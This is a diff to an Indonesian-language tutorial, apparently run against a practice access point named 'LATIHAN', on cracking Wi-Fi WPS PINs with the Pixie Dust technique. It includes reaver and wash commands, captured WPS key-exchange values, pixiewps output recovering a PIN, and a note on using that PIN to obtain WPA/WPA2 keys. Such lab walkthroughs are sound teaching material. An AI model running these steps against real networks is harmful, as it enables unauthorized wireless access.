@@ -39,9 +39,18 @@ BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 9C:C1:72:6B:DF:88    9  -17  2.0  No   RalinkTe  LATIHAN
 ```
 
-Pastiin status `Lck` nya kaga `Yes`, kalo `Yes` itu artinya WPS target ke lock. Kalo ke lock kaga bisa diserang.
+Catet:
+- `ESSID`: Nama Wi-Fi
+- `BSSID`: MAC address AP
+- `Ch`: Channel AP
+- `dBm`: Kekuatan sinyal AP dalam satuan decibel-milliwatt (dBm)
+- `Lck`: Status WPS
+- `Vendor`: Nama vendor AP
 
-#### 3. Cari Data yang Dibutuhin PixieWPS
+> [!NOTE]
+> Pastiin status `Lck` nya kaga `Yes`, kalo `Yes` itu artinya WPS target ke lock. Kalo ke lock kaga bisa diserang.
+
+#### 3. Cari Data yang Dibutuhin Sama PixieWPS
 - Enrollee public key
 - Registrar public key
 - Enrollee hash-1
@@ -194,7 +203,7 @@ sudo reaver -i [interface] -e [essid] -b [bssid] -c [channel] -g 1 -vvv > output
    252d73119b816819c4a2c97b72da1857
    ```
 
-#### 4. Simpen Data yang Dibutuhin PixieWPS
+#### 4. Simpen Data yang Dibutuhin Sama PixieWPS
 - Enrollee public key: `928ef515e2be7880bfed3efb79086be6f90596a3c64bababf1698ddd4a10c3cd08a21bb30dc271c6fe6ab001617ada2cc745886bc0e38e8d5b5908e27a9151ec0ccd74883453cb71e3c7186bc6f85e54cae90b13d115066eb993f4604fedb20fb97cd8ea713ccae0140bd259cd0e7a2e4e193408a48ef60433572cd66acef799905c86ba99b15fa9d9aedb25875e888aed55953c886a2faa08421da88e3445220161ea85751afd954b9376affc684e47754d57b7f8ec300137dddc75c532398a`
 - Registrar public key: `ca286a7ee50a4079c1fd71cf73270a896de7a4fd88cd7c43fbe2ef871f84456602680074275aa6b37d5603d2227800f5cd415d3a320c3d6aa3df74a38ec716b5bb2968d4783e09649225087062137fe71ef73bde91eaf5e4621afdbf4bff559f295b6a8b773c92c9dfea5ac6be7083492d45f6ea17e20c896d7a232c985223114c667286841cd783bd6e75ad4481bd260bb66071a89b56c7d839fe7cee808f3ca14de3a14a93b88d1f5cdf23a76a9d76f92c623febc43d2e68d1f8796dedbbe8`
 - Enrollee hash-1: `18bd4e5856e058613becd0e88f852ef78999325b60b3641977ba03bc1fbc3027`
@@ -235,3 +244,6 @@ Pixiewps 1.4
 ```
 
 PIN WPS: `56468373`
+
+> [!NOTE]
+> PIN yang didapet bisa dipake di Reaver pake teknik Known PIN Attack buat crack kunci WPA/WPA2-PSK.
